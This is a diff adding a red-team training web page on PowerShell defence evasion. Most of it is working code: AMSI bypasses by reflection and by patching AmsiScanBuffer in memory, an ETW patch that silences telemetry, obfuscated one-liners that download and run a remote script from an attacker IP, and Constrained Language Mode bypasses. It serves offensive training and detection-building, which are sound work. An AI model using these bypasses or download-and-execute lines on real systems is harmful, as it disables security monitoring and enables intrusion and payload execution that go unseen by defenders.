@@ -1,0 +1,213 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="PowerShell Evasion Techniques — Red Team Academy"
+  module="Tool Development"
+  tags={['powershell', 'evasion', 'amsi-bypass', 'etw-bypass', 'reflection', 'obfuscation']}
+  pageKey="tooldev-ps-evasion"
+>
+  <h1>PowerShell Evasion Techniques</h1>
+
+  <h2>Overview</h2>
+  <p>Modern PowerShell defences include AMSI (Antimalware Scan Interface), Script Block Logging, Module Logging, Transcription Logging, Constrained Language Mode (CLM), and ETW (Event Tracing for Windows). This module covers techniques to bypass each layer using reflection, memory patching, and language-level obfuscation. Understanding these bypasses is essential for both red team operators and defenders building detection rules.</p>
+
+  <h2>AMSI Bypass via .NET Reflection (Patching amsiInitFailed)</h2>
+  <p>AMSI initialisation is tracked by a private static field <code>amsiInitFailed</code> in the <code>System.Management.Automation.AmsiUtils</code> class. Setting this field to <code>$true</code> causes AMSI to report that initialisation failed and skip all subsequent scans. This works in PowerShell 5.x without requiring admin rights.</p>
+  <pre><code># Method 1: Set amsiInitFailed via reflection.
+# Note: This specific bypass is now detected by most AV/EDR products.
+# It is shown here for educational purposes — understand what is being patched.
+
+# Access the internal AmsiUtils type (non-public, requires reflection)
+$amsiType = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+
+# Get the amsiInitFailed field — it is NonPublic and Static
+$field = $amsiType.GetField("amsiInitFailed",
+    [Reflection.BindingFlags]"NonPublic,Static")
+
+# Set the field to $true — AMSI reports it failed to initialise and stops scanning
+$field.SetValue($null, $true)
+
+Write-Host "[+] AMSI disabled via reflection (amsiInitFailed = true)"
+
+# ── Verify bypass is active ───────────────────────────────────────────────────
+# AMSI-test string (safe — this is a known test string, not real malware):
+# [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() — should work
+# amsiutils test string: "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
+# After bypass, this string should NOT be flagged by AMSI</code></pre>
+
+  <h2>AMSI Bypass via Memory Patch (AmsiScanBuffer)</h2>
+  <p>Patch the <code>AmsiScanBuffer</code> function in <code>amsi.dll</code> to immediately return <code>AMSI_RESULT_CLEAN</code> (0x80070057) or force an error return. This requires P/Invoke to modify process memory — works regardless of PowerShell version but requires the DLL to be loaded. More reliable than field patching across PS versions.</p>
+  <pre><code># Method 2: Patch AmsiScanBuffer in amsi.dll to return clean result.
+# The patch overwrites the first few bytes with a 'return 0' instruction sequence.
+
+$PatchCode = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class AmsiPatch &#123;
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+
+    public static void Patch() &#123;
+        // Load amsi.dll (usually already loaded in the PowerShell process)
+        IntPtr lib = LoadLibrary("amsi.dll");
+        if (lib == IntPtr.Zero) throw new Exception("Could not load amsi.dll");
+
+        // Find the AmsiScanBuffer export
+        IntPtr func = GetProcAddress(lib, "AmsiScanBuffer");
+        if (func == IntPtr.Zero) throw new Exception("AmsiScanBuffer not found");
+
+        // x64 patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
+        // This makes AmsiScanBuffer return an error code, causing the calling code
+        // to skip the scan (treated as AMSI_RESULT_CLEAN by PowerShell runtime)
+        byte[] patch = new byte[] &#123; 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 &#125;;
+        //                          ^^mov eax,                         ^^ret
+
+        // Make the memory region writable (change from PAGE_EXECUTE_READ to PAGE_EXECUTE_READWRITE)
+        uint oldProtect;
+        VirtualProtect(func, (UIntPtr)patch.Length, 0x40, out oldProtect);
+
+        // Write the patch bytes over the start of AmsiScanBuffer
+        Marshal.Copy(patch, 0, func, patch.Length);
+
+        // Restore original page protection (avoid leaving RWX pages)
+        VirtualProtect(func, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+    &#125;
+&#125;
+'@
+
+Add-Type -TypeDefinition $PatchCode
+[AmsiPatch]::Patch()
+Write-Host "[+] AmsiScanBuffer patched — AMSI disabled for this session"</code></pre>
+
+  <h2>ETW (Event Tracing for Windows) Bypass</h2>
+  <p>ETW is the telemetry layer used by Windows Defender, Microsoft Defender for Endpoint, and Sysmon to capture PowerShell events. Patching <code>EtwEventWrite</code> in <code>ntdll.dll</code> stops events from being published to ETW consumers — effectively silencing telemetry for the current process.</p>
+  <pre><code># ETW bypass: patch EtwEventWrite in ntdll.dll to return immediately.
+# This prevents PowerShell script block events from reaching ETW consumers.
+# Requires P/Invoke to modify process memory.
+
+$EtwCode = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class EtwBypass &#123;
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string moduleName);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr addr, UIntPtr size,
+        uint newProtect, out uint oldProtect);
+
+    public static void Patch() &#123;
+        // EtwEventWrite lives in ntdll.dll (always loaded)
+        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+        IntPtr func  = GetProcAddress(ntdll, "EtwEventWrite");
+
+        // Patch: xor rax, rax (zero return value = SUCCESS); ret
+        // This makes every ETW event write appear to succeed while doing nothing
+        byte[] patch = new byte[] &#123; 0x48, 0x33, 0xC0, 0xC3 &#125;;
+        //                        xor rax,rax    ret
+
+        uint old;
+        VirtualProtect(func, (UIntPtr)4, 0x40, out old);   // PAGE_EXECUTE_READWRITE
+        Marshal.Copy(patch, 0, func, patch.Length);
+        VirtualProtect(func, (UIntPtr)4, old, out old);    // restore
+    &#125;
+&#125;
+'@
+
+Add-Type -TypeDefinition $EtwCode
+[EtwBypass]::Patch()
+Write-Host "[+] EtwEventWrite patched — ETW events suppressed for this process"</code></pre>
+
+  <h2>PowerShell String Obfuscation Techniques</h2>
+  <p>Static signature detection looks for known offensive strings. Obfuscation breaks these strings into fragments, uses alternate encoding, or invokes cmdlets via variable expansion and reflection. The following patterns are building blocks for generating detection-resistant scripts.</p>
+  <pre><code"># ── String concatenation — breaks static signatures ──────────────────────────
+# 'IEX' → split across multiple variables:
+$a = "I"; $b = "E"; $c = "X"
+&amp; ($a+$b+$c) (New-Object Net.WebClient).DownloadString("http://10.10.14.5/s.ps1")
+
+# ── Reverse string ────────────────────────────────────────────────────────────
+$rev = "noisserpxE-ekovnI"[-1..-($("noisserpxE-ekovnI".Length)) -join '']
+# Equivalent to: Invoke-Expression (reversed)
+
+# ── Backtick insertion — PS ignores backticks within strings ──────────────────
+# Backtick before non-special chars is a no-op in PowerShell:
+I`n`v`o`k`e`-`E`x`p`r`e`s`s`i`o`n "whoami"
+
+# ── Base64-encoded command (avoid logging the plaintext in CLSM) ──────────────
+$cmd = "whoami | Out-File C:\Windows\Temp\out.txt"
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell.exe -EncodedCommand $enc
+
+# ── SecureString round-trip to obfuscate a string in memory ──────────────────
+# Stores the string as an encrypted SecureString, converts back at runtime:
+$ss  = ConvertTo-SecureString "IEX" -AsPlainText -Force
+$ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss)
+$iex = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
+&amp; $iex (New-Object Net.WebClient).DownloadString("http://10.10.14.5/s.ps1")
+
+# ── Environment variable substitution ────────────────────────────────────────
+$env:COMSPEC    # = C:\Windows\System32\cmd.exe
+$env:PSModulePath   # contains paths to PS module dirs
+
+# Use an env var to store part of a command:
+$env:_TMP = "DownloadString"
+(New-Object Net.WebClient).$env:_TMP("http://10.10.14.5/s.ps1") | IEX
+
+# ── CHAR() encoding — build string from char codes ───────────────────────────
+# 'IEX' from char codes (73=I, 69=E, 88=X):
+$iex = [char]73 + [char]69 + [char]88
+&amp; $iex "whoami"
+
+# ── Type accelerator obfuscation ──────────────────────────────────────────────
+# Use the full .NET type name instead of the PS alias to avoid keyword detection:
+# 'Net.WebClient' → [System.Net.WebClient]
+[Activator]::CreateInstance([Type]::GetType("System.Net.WebClient")).DownloadString("http://10.10.14.5/s.ps1") | IEX</code></pre>
+
+  <h2>Constrained Language Mode (CLM) Bypass</h2>
+  <p>CLM is enforced by AppLocker or WDAC policies. It restricts .NET type access, Add-Type, and direct COM object creation. Several bypasses exist depending on the enforcement mechanism: InstallUtil, MSBuild, and PowerShell 2.0 downgrade (already covered in LOLBins).</p>
+  <pre><code># ── Detect if CLM is active ───────────────────────────────────────────────────
+$ExecutionContext.SessionState.LanguageMode
+# FullLanguage = unrestricted; ConstrainedLanguage = restricted
+
+# ── Bypass 1: PowerShell 2.0 downgrade (if .NET 2.0 is installed) ────────────
+# PS 2.0 predates CLM — it runs in FullLanguage mode regardless of AppLocker policy
+powershell.exe -version 2 -nop -ep bypass -c "..."
+
+# ── Bypass 2: Find writeable paths that are not covered by AppLocker ──────────
+# AppLocker default rules only cover %WINDIR% and %PROGRAMFILES%
+# Writeable paths outside these may allow script execution:
+$writeable = @(
+    "$env:TEMP",
+    "C:\ProgramData",
+    "C:\Users\$env:USERNAME\AppData"
+)
+# Copy powershell.exe to a user-writeable path and run from there:
+Copy-Item $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\update.exe
+&amp; "$env:TEMP\update.exe" -nop -ep bypass -c "..."
+
+# ── Bypass 3: PowerShell runspaces in a compiled DLL ─────────────────────────
+# C# code running as a DLL can create a PowerShell runspace in FullLanguage mode
+# because the DLL is not subject to AppLocker script rules (only binaries matter)
+# See 'Invoke-MemoryAssembly' from the post-exploitation module
+
+# ── Bypass 4: MSBuild inline C# task (covered in LOLBins Advanced) ───────────
+# MSBuild compiles and executes C# inline — bypasses AppLocker script rules
+
+# ── Bypass 5: JEA (Just Enough Administration) misconfiguration ───────────────
+# If JEA endpoints expose cmdlets that can be chained for RCE:
+Get-PSSessionConfiguration | Where-Object &#123; $_.LanguageMode -ne "NoLanguage" &#125;</code></pre>
+
+</TrainingPage>
